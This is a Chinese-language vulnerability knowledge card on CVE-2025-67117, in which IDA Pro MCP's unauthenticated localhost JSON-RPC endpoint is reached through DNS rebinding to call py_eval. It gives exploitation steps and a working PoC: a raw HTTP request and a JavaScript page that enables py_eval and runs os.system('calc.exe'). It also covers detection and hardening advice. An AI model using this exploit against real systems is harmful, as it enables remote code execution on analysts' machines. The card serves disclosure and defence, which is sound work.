---
id: ai-security-mcp-security-ida-pro-mcp-dns-rebinding-py-eval-rce
title: IDA Pro MCP 本地 JSON-RPC 无认证/无 Origin 校验：DNS rebinding 调用 py_eval 实现 RCE（CVE-2025-67117）
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: ida-pro-mcp-dns-rebinding-py-eval-rce
aliases:
- CVE-2025-67117
- IDA-PRO-MCP RCE
- py_eval 远程代码执行
- 127.0.0.1:13337 MCP
- DNS rebinding MCP
- ida_mcp py_eval
tags:
- ai-security
- mcp
- ida-pro
- dns-rebinding
- cors
- localhost
- json-rpc
- py-eval
- rce
- cve-2025-67117
cve:
- CVE-2025-67117
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V164
  verified_at: '2026-11-06T13:48:44+08:00'
  notes: 已对照原文与8张图核对：127.0.0.1:13337 的 /mcp、/sse、/config.html；ida_mcp/api_python.py 的 py_eval 使用 eval/exec；/config 表单可提交 py_eval=py_eval；Chrome 143 + rebinder 域名跨站 POST /mcp 执行 calc.exe，均与原文/截图一致。原文未给具体受影响版本（仅 CVE-2025-67117），affected_versions 未设置。PoC 未在本机复跑；无 sources/source_url。
---

## 一句话结论

IDA Pro MCP 在 `127.0.0.1:13337` 暴露无认证的 JSON-RPC over HTTP（`/mcp`），且未校验 `Origin`/`Host`；当 `py_eval` 工具启用时，恶意网页可用 DNS rebinding 把自己的域名解析到 `127.0.0.1`，以同源方式 POST `tools/call` 调用 `py_eval`，在 IDA 进程权限下执行任意 Python 代码与系统命令（CVE-2025-67117）。

## 原理

- **本地回环不是安全边界**：监听 `127.0.0.1` 只阻止远程主机直连，浏览器本身是本地进程，网页 JavaScript 可以向 localhost 发请求；同源策略（SOP）原本阻止跨域读取响应，但 DNS rebinding 可以绕过。
- **DNS rebinding 绕过同源策略**：攻击者域名 `evil.example` 的 DNS TTL 设为 0，首次解析返回攻击者 IP（页面加载），随后重新解析返回 `127.0.0.1`；浏览器仍认为 `evil.example:13337` 是同一源，于是允许页面 JS 向该源发请求，而请求实际落到本机 MCP 服务。
- **MCP HTTP 接口无认证**：`ida-pro-mcp` 默认启动 `Streamable HTTP: http://127.0.0.1:13337/mcp`、`SSE: /sse` 与 `Config: /config.html`；`/mcp` 接受 JSON-RPC `tools/call`，没有 token、会话或来源校验，服务器也不拒绝 Host 为攻击者域名的请求。
- **`py_eval` 是直接代码执行 sink**：`ida_mcp/api_python.py` 中 `py_eval(code)` 用 `eval(code, exec_globals)` 优先求值，失败后 `exec(code, exec_globals, exec_locals)` 执行语句，`exec_globals` 包含 IDA API 模块；因此 `__import__('os').system('calc.exe')` 可在 IDA 进程内执行任意 Python/系统命令。
- **配置接口同样可被跨站调用**：`/config.html` 是工具开关页面，`POST /config` 用表单字段控制启用哪些工具；攻击页面可先提交包含 `py_eval=py_eval` 的表单启用该工具，再调用 `/mcp`，无需受害者手动勾选。
- **为什么这是 RCE 而非仅信息泄露**：`py_eval` 的语义就是“在 IDA 上下文执行任意 Python”，具备文件读写、网络、进程创建能力；IDA 通常以开发者/分析师用户权限运行，可能持有许可证、项目文件、样本与凭据。
- **利用条件**：受害者运行 IDA Pro MCP 并访问恶意页面；浏览器未阻止对私网/回环的跨源请求（Chrome 的 Private Network Access 可能增加预检，但文章在 Chrome 143 环境实测成功）；DNS rebinding 域名 TTL 足够短。

## 触发条件

- IDA Pro 安装了 `ida-pro-mcp` 并启动 MCP 服务，默认监听 `127.0.0.1:13337`。
- `py_eval` 工具已启用，或 `/config` 接口可未授权访问并允许攻击者提交表单启用它。
- 受害者使用浏览器访问攻击者控制的页面，页面 JS 可执行；攻击者拥有可控 DNS 域名（短 TTL）。
- 服务端未校验 `Host`/`Origin`，未要求认证 token，也未对 localhost 请求做来源限制。
- 浏览器/系统未启用阻止 localhost 访问或 PNA 强制预检的安全策略。

## 利用步骤

1. 确认目标本机 MCP 服务：访问 `http://127.0.0.1:13337/mcp`、`/sse`、`/config.html`，确认 `py_eval` 是否启用。
2. 用 DNS rebinding 服务生成域名（如 `lock.cmpxchg8b.com/rebinder.html`，A 填攻击者 IP、B 填 `127.0.0.1`），得到形如 `72727272.7f000001.rbndr.us` 的域名。
3. 若 `py_eval` 未启用，先向 `http://<rebind-domain>:13337/config` POST 表单（包含 `py_eval=py_eval`，其余工具字段按页面原样带上）启用。
4. 在攻击页面中用 `fetch` 向 `http://<rebind-domain>:13337/mcp` 发送 JSON-RPC：
   ```json
   {"jsonrpc":"2.0","id":1,"method":"tools/call",
    "params":{"name":"py_eval","arguments":{"code":"__import__('os').system('calc.exe')"}}}
   ```
   `Content-Type` 用 `text/plain;charset=UTF-8` 可避免预检（简单请求）；命令执行不依赖读取响应。
5. 受害者访问页面后，浏览器重新解析域名到 `127.0.0.1`，请求命中本机 MCP，`py_eval` 执行命令（如弹出计算器、写文件、反弹 shell）。
6. 通过 DNS/HTTP 回连或本地文件验证执行结果。

## PoC

```http
POST /mcp HTTP/1.1
Host: 127.0.0.1:13337
Content-Type: text/plain;charset=UTF-8
Content-Length: 133

{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"py_eval","arguments":{"code":"__import__('os').system('calc.exe')"}}}
```

```html
<script>
const base = "http://<rebind-domain>:13337";
// 可选：先启用 py_eval（表单字段按 /config.html 实际页面构造）
fetch(base + "/config", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "idb_meta=idb_meta&py_eval=py_eval"
});
// 调用 py_eval 执行命令
fetch(base + "/mcp", {
  method: "POST",
  headers: {"Content-Type": "text/plain;charset=UTF-8"},
  body: JSON.stringify({
    jsonrpc: "2.0", id: 1, method: "tools/call",
    params: {name: "py_eval", arguments: {code: "__import__('os').system('calc.exe')"}}
  })
});
</script>
```

说明：原文在 Chrome 143 + IDA Pro MCP 环境用 rebinder 域名实测弹出计算器；本卡未在本机复跑。`/config` 的完整表单字段需按目标版本页面实际内容构造。

## 变体与关联

- **其他本地 MCP 服务**：同样无认证/无 Origin 校验的 MCP Inspector、MCPJam、browser-use web-ui、OAuth 授权服务器等，均可能被 DNS rebinding 或跨站请求利用；见关联卡。
- **sink 变体**：`py_eval` 换成任意具备命令执行、文件写入、调试内存写的工具（如 `dbg_write_mem`、`patch_asm`）也能造成代码执行或数据篡改；`py_eval` 只是最直接。
- **rebinding 变体**：rbndr、rebinder.html、自建 0 TTL DNS；也可尝试 `localtest.me` 等解析到 127.0.0.1 的域名（若服务端只校验 Host 白名单则失效）。
- **浏览器差异**：Chrome Private Network Access、Firefox localhost 限制、企业策略可能阻断；攻击者可用 no-cors 简单请求规避预检，但读取响应需要同源。
- **关联**：[[ai-security-mcp-security-inspector-cors-stdio-rce]]（MCP Inspector 宽 CORS/CSRF）、[[ai-security-mcpjam-inspector-api-mcp-connect-rce]]（未授权 MCP 连接 RCE）、[[ai-security-mcp-security-oauth-authz-server-missing-host-check-rebinding]]（MCP OAuth DNS rebinding）、[[web-generic-cors-mlflow-dns-rebinding-missing-host-validation]]（本地 REST API DNS rebinding 通用模式）。

## 检测与防御

- **认证与来源校验**：MCP HTTP 服务必须要求 token/会话认证；校验 `Host` 只允许 `127.0.0.1:13337`/`localhost:13337`，校验 `Origin` 只允许受信来源；拒绝 `Origin: null` 与跨站 `Sec-Fetch-Site`。
- **默认关闭危险工具**：`py_eval`、`dbg_write_mem`、`patch_asm` 等 `@unsafe` 工具默认关闭，启用需本地人工确认；`/config` 端点要求认证并做 CSRF 防护。
- **网络层**：MCP 仅绑定回环；浏览器侧启用 PNA/localhost 限制；企业可下发策略阻止网页访问 127.0.0.1；分析机与日常浏览分离，IDA 运行在隔离 VM。
- **检测**：审计 `/mcp` 请求中出现 `py_eval`、`__import__`、`os.system`、`subprocess`、`calc.exe`、`powershell`；关注 Host 为外部域名、`Sec-Fetch-Site: cross-site`/`Origin: null` 的本地请求；监控 IDA 进程派生 `cmd.exe`/`powershell`/`sh`；DNS 日志中出现 rbndr.us 等 rebinding 域名。
- **修复**：升级 `ida-pro-mcp` 至修复版本；无法升级时关闭 HTTP 传输、仅用 stdio，或在前置代理强制认证与 Host/Origin 校验。
